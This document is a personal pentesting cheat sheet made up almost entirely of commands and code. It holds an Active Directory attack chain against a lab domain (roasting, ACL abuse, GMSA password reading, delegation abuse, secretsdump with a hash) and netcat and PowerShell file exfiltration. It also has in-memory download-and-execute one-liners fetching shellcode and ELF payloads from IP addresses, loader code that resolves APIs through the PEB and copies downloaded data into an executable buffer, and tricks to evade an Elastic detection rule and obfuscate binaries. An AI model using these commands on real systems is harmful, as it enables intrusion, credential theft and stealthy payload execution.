# Pentesting Blog
https://web.archive.org/web/20221126165225/https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html#enumeration

# Recon - Grep network packets
```bash
sudo ngrep -i -d <network interface> 's.?a.?m.?b.?a.*[[:digit:]]' port 139
smbclient -U '%' -N -L \\\\10.10.10.10\\
```

# Windows Notes

## AD Commands
```ps
# AS-REP
GetNPUsers.py rebound.htb/ -usersfile users.txt -dc-ip 10.10.11.231 -format hashcat -outputfile as_rep_hashes.txt | grep -F -e '[+]' -e '[-]'

# Kerberos 5, etype 23, AS-REP
hashcat -m 18200 -a 0 -O -w 4 hash rockyou.txt

# Kerberos 5, etype 23, TGS-REP
hashcat -m 13100 -a 0 -O -w 4 hashes.txt rockyou.tx

# https://www.thehacker.recipes/ad/movement/kerberos/kerberoast#kerberoast-w-o-pre-authentication
GetUserSPNs.py -target-domain rebound.htb -usersfile users.txt -dc-ip 10.10.11.231 rebound.htb/guest -no-pass

# Sync clock with DC
timedatectl set-ntp 0
sudo ntpdate -qu rebound.htb
sudo ntpdate rebound.htb

# Rust BloodHound ingestor - https://github.com/NH-RED-TEAM/RustHound
/home/kali/.cargo/bin/rusthound -d rebound.htb -u 'ldap_monitor@rebound' -p $passwd -i 10.10.11.231 --zip --ldaps

# AD Privilege Escalation Framework - https://github.com/CravateRouge/bloodyAD/wiki/User-Guide
# Add user to group
python bloodyAD.py -u oorend -p 'pass' -d rebound.htb --host 10.10.11.231 add groupMember SERVICEMGMT oorend

# you should see response below 
[+] oorend added to SERVICEMGMT

# Grant user GenericAll permissions over an OU
python bloodyAD.py -d rebound.htb -u oorend -p 'pass' --host 10.10.11.231 add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' oorend

# you should see response below 
[+] oorend has now GenericAll on OU=SERVICE USERS,DC=REBOUND,DC=HTB

# With GenericAll permission grab NT Hash via certipy - https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-certificate-services
certipy shadow auto -account winrm_svc -u "oorend@rebound.htb" -p $passwd -dc-ip 10.10.11.231 -k -target dc01.rebound.htb

# ReadGMSAPassword attack using bloodyAD
/root/bloodyAD/bloodyAD.py -d rebound.htb -u tbrady -p $passwd --host dc01.rebound.htb get object 'delegator$' --resolve-sd --attr msDS-ManagedPassword

# Resource Based Constrained Delegation Attack - https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd
# obtain TGT ticket for delegator$ - use NTLM hash obtained from ReadGMSAPassword attack
getTGT.py 'rebound.htb/delegator$@dc01.rebound.htb' -hashes aad3b435b51404eeaad3b435b51404ee:f8db61f5fd0643c073cd58ffcc81379f -dc-ip 10.10.11.231
export KRB5CCNAME=delegator\$@dc01.rebound.htb.ccache

# Assign delegation privilege to user 
rbcd.py 'rebound.htb/delegator$' -delegate-from ldap_monitor -delegate-to 'delegator$' -action write -use-ldaps -dc-ip 10.10.11.231 -debug -k -no-pass

# Uses a service principal’s TGT to get a Kerberos service ticket for an SPN as an impersonated account via S4U
getTGT.py 'rebound.htb/ldap_monitor:pass' -dc-ip 10.10.11.231
export KRB5CCNAME=ldap_monitor.ccache 
getST.py -spn "browser/dc01.rebound.htb" -impersonate "dc01$" "rebound.htb/ldap_monitor" -k -no-pass -dc-ip 10.10.11.231

# Use the service’s TGT plus the delegator’s proof (S4U2Proxy with an additional-ticket) to request an HTTP service ticket issued to the target machine account, save that machine-account ticket to a ccache
export KRB5CCNAME=dc01\$.ccache
getST.py -spn "http/dc01.rebound.htb" -impersonate "dc01$" -additional-ticket "dc01$.ccache" "rebound.htb/delegator$" -hashes aad3b435b51404eeaad3b435b51404ee:f8db61f5fd0643c073cd58ffcc81379f -k -no-pass -dc-ip 10.10.11.231

# Present machine-account Kerberos service ticket to DC for secrets dump
secretsdump.py -no -k dc01.rebound.htb -just-dc-user administrator -dc-ip 10.10.11.231
```

## Transfer file via PowerShell to Linux
```ps
$serverPort = 5555
$serverIp = "10.10.10.103"
$fileToSend = "test.txt"
$fileBytes = [System.IO.File]::ReadAllBytes($fileToSend)
$client = New-Object System.Net.Sockets.TcpClient
$client.Connect($serverIp, $serverPort)
$stream = $client.GetStream()
$stream.Write($fileBytes, 0, $fileBytes.Length)
$stream.Close()
$client.Close()
```

```bash
# Linux listener
nc -l -p 5555 > test.txt
```

## Run PowerUp in memory without saving to disk, call Invoke-AllChecks at end of script

### CMD
```cmd
echo IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/PowerUp.ps1') | powershell -noprofile -
```

### PowerShell
```ps
wget('http://10.10.10.10/PowerUp.ps1') -UseBasicParsing|iex
```

## If a SMB share you have access to, download it, and extract it
```bash
smbclient \\\\10.10.10.10\\share -p <Port> -N -Tc share.tar; tar xf share.tar -C share
```

## Compile cl.exe
```cmd
cl.exe /nologo /MT /Ox /W0 /GS- /EHs- /GR- /DNDEBUG /Tp auth_validator.cpp /link /DYNAMICBASE:NO /NXCOMPAT:NO /OUT:auth_validator.exe /SUBSYSTEM:WINDOWS /MACHINE:x64 /ENTRY:WinMain /NODEFAULTLIB /MERGE:.rdata=.text /MERGE:.pdata=.text /MERGE:.data=.text Ws2_32.lib user32.lib ucrt.lib libcmt.lib shlwapi.lib
```

## Expand crt heap to 1MB - calls NtAllocateVirtualMemory
```cmd
cl.exe /nologo /MT /Ox /W0 /GS- /DNDEBUG /Tc no_library.c /link kernel32.lib /OUT:no_library.exe /SUBSYSTEM:WINDOWS /MACHINE:x64 /ENTRY:WinMain /NODEFAULTLIB /HEAP:0x100000,0x100000
```

## Add rwx code segment - calls NtCreateSection and NtMapViewOfSection
```c
#pragma section(".code", execute, read, write)
#pragma comment(linker,"/SECTION:.code,ERW")
__declspec(allocate(".code")) unsigned char allocatedBuffer[1024];
```

## Allocate buffer to data segment - calls NtCreateSection and NtMapViewOfSection
```c
#pragma section(".data", read, write)
__declspec(allocate(".data")) unsigned char allocatedBuffer[1024];
```

## Compile syscalls masm
```cmd
ml64 /c syscalls.asm /Fo syscalls.obj
```

## Compile csc.exe
```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /optimize+ /debug- .\data_recovery.cs
```

## Compile roslyn compiler
```ps
& "C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\Roslyn\csc.exe" /optimize+ /unsafe /debug- .\program.cs .\Structs.cs
```

## dotnet publish application
```cmd
dotnet publish -c Release -r win-x64 --self-contained /p:PublishSingleFile=true /p:PublishTrimmed=true /p:EnableCompressionInSingleFile=true
```

## Converts COM type libraries into .NET assemblies
```cmd
tlbimp C:\Windows\System32\wsmauto.dll /out:WSManAutomation.dll
```

## Add reference to project
```cmd
dotnet add reference WSManAutomation.dll
```

## Windows - only GetProcAddress 
```cpp
#include <windows.h>
#include <stdint.h>

typedef int (__cdecl *pRand)(void);
typedef void* (__cdecl *pMalloc)(size_t);
typedef void (__cdecl *pFree)(void*);
typedef int (WINAPI *pMessageBoxA)(HWND, LPCSTR, LPCSTR, UINT);
typedef void (WINAPI *pExitProcess)(UINT);

#pragma function(memcpy)

// Custom memcpy
void *memcpy(void *dest, const void *src, size_t count) {
    unsigned char *d = (unsigned char *)dest;
    const unsigned char *s = (const unsigned char *)src;
    while (count--) *d++ = *s++;
    return dest;
}


// Resolve kernel32 base via PEB
HMODULE get_kernel32_base() {
    PVOID peb = (PVOID)__readgsqword(0x60);
    PVOID ldr = *(PVOID*)((BYTE*)peb + 0x18);
    PVOID list = *(PVOID*)((BYTE*)ldr + 0x10);
    PVOID firstEntry = *(PVOID*)((BYTE*)list);
    PVOID secondEntry = *(PVOID*)((BYTE*)firstEntry);
    return *(HMODULE*)((BYTE*)secondEntry + 0x30);
}

template<typename T>
class vector {
private:
    T* data;
    size_t capacity;
    size_t size;
    pMalloc mallocFn;
    pFree freeFn;

public:
    vector(size_t initialSize, pMalloc m, pFree f)
        : capacity(initialSize), size(0), mallocFn(m), freeFn(f) {
        data = (T*)mallocFn(sizeof(T) * capacity);
    }

    ~vector() {
        freeFn(data);
    }

    size_t Size() const { return size; }

    T& operator[](size_t index) { return data[index]; }

    void push_back(const T& value) {
        if (size >= capacity) {
            capacity = capacity == 0 ? 1 : capacity * 2;
            T* newData = (T*)mallocFn(sizeof(T) * capacity);
            for (size_t i = 0; i < size; ++i) {
                newData[i] = data[i];
            }
            freeFn(data);
            data = newData;
        }
        data[size++] = value;
    }
};

void Sort(vector<int>& arr) {
    int n = arr.Size();
    for (int i = 0; i < n - 1; i++) {
        for (int j = 0; j < n - i - 1; j++) {
            if (arr[j] > arr[j + 1]) {
                int temp = arr[j];
                arr[j] = arr[j + 1];
                arr[j + 1] = temp;
            }
        }
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    HMODULE hKernel32 = get_kernel32_base();
    FARPROC (*GetProcAddressFn)(HMODULE, LPCSTR) = (FARPROC (*)(HMODULE, LPCSTR))GetProcAddress(hKernel32, "GetProcAddress");
    HMODULE (*LoadLibraryAFn)(LPCSTR) = (HMODULE (*)(LPCSTR))GetProcAddressFn(hKernel32, "LoadLibraryA");

    HMODULE hMsvcrt = LoadLibraryAFn("msvcrt.dll");
    HMODULE hUser32 = LoadLibraryAFn("user32.dll");

    pRand randFn = (pRand)GetProcAddressFn(hMsvcrt, "rand");
    pMalloc mallocFn = (pMalloc)GetProcAddressFn(hMsvcrt, "malloc");
    pFree freeFn = (pFree)GetProcAddressFn(hMsvcrt, "free");
    pMessageBoxA MessageBoxA = (pMessageBoxA)GetProcAddressFn(hUser32, "MessageBoxA");

    int k = 50000;
    vector<int> brr(k, mallocFn, freeFn);

    for (int j = 0; j < k; ++j) {
        brr.push_back(randFn());
    }

    Sort(brr);

    MessageBoxA(NULL, "Sort complete!", "Status", MB_OK);
    pExitProcess ExitProcessFn = (pExitProcess)GetProcAddressFn(hKernel32, "ExitProcess");
	ExitProcessFn(0);
}
```

## Windows page-align malloc
```c
#define CHUNK (56 * 1024)
#define MAX_CHUNKS 5
#define PAGE_SIZE 4096
DWORD totalSize = 0, bytesRead = 0;
DWORD maxSize = MAX_CHUNKS * CHUNK;
void* tempBuffer = mallocFunc(maxSize);
if (!tempBuffer) {
    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);
    return -1;
}

while (totalSize < maxSize) {
    if (!InternetReadFile(hFile, (BYTE*)tempBuffer + totalSize, CHUNK, &bytesRead) || bytesRead == 0) {
        break;
    }
    totalSize += bytesRead;
}

InternetCloseHandle(hFile);
InternetCloseHandle(hInternet);

if (totalSize == 0) {
    MessageBoxA(NULL, "No data downloaded", "Error", MB_OK);
    freeFunc(tempBuffer);
    return -1;
}

size_t roundedSize = (totalSize + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1);
void* raw = mallocFunc(roundedSize + PAGE_SIZE);
if (!raw) {
    MessageBoxA(NULL, "Failed to allocate raw buffer", "Error", MB_OK);
    freeFunc(tempBuffer);
    return -1;
}

void* execBuffer = (void*)(((uintptr_t)raw + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1));
memcpy(execBuffer, tempBuffer, totalSize);
freeFunc(tempBuffer);
```

# Linux Notes

## Obfuscate ELF
https://github.com/Trigleos/ELFREVGO.git
```bash
ELFREVGO/bin/ELFREVGO -f test -e -t -n -gd execve -gf custom_logger -o testx
```

## Netcat Transfer folder Linux to Linux
```bash
nc -l -p 1234 | tar xf -
tar cf - /home/debian | nc 10.10.10.10 1234
```

## Unique way to enumerate SUID binaries, evades this rule
https://github.com/elastic/detection-rules/blob/main/rules/linux/discovery_suid_sguid_enumeration.toml
```bash
find / -type f 2>/dev/null -exec stat -c "%A %n" {} + | grep '^...s'
```

## Python3 run ELF in memory with no parameters
```bash
python3.7 -c 'import os, urllib.request; d=urllib.request.urlopen("http://10.10.0.103/test.exe"); fd=os.memfd_create("foo"); os.write(fd,d.read()); p=f"/proc/self/fd/{fd}"; os.execve(p, [p], {})'
```

## Python3 run ELF in memory with parameters
```bash
python3 -c 'import os; import urllib.request; d = urllib.request.urlopen("https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap?raw=true"); fd = os.memfd_create("foo"); os.write(fd, d.read()); p = f"/proc/self/fd/{fd}"; os.execve(p, [p,"-Pn", "-n", "127.0.0.1"], {})'
```

## Python2 map and execute shellcode in memory
```bash
/usr/bin/python -c 'import urllib2,mmap,ctypes;d=urllib2.urlopen("http://8.209.128.8/a").read();m=mmap.mmap(-1,len(d),34,7);m.write(d);ctypes.CFUNCTYPE(None)(ctypes.addressof(ctypes.c_char.from_buffer(m)))()'
```

## Python2 - Write ELF as temp file and execute
```bash
/usr/bin/python -c 'import os,urllib2,tempfile;d=urllib2.urlopen("http://8.209.128.8/config").read();f=tempfile.NamedTemporaryFile(delete=False);f.write(d);f.close();os.chmod(f.name,0755);os.execve(f.name,[f.name,"-pthread"],{})'
```

# FreeBSD - Cross-Compile
```bash
clang --target=x86_64-unknown-freebsd12.2 --sysroot=/root/cross_compiler/freebsd-12.2-sysroot -I/root/cross_compiler/freebsd-12.2-sysroot/usr/include -L/root/cross_compiler/freebsd-12.2-sysroot/usr/lib -o shell shell.c -fPIC
```
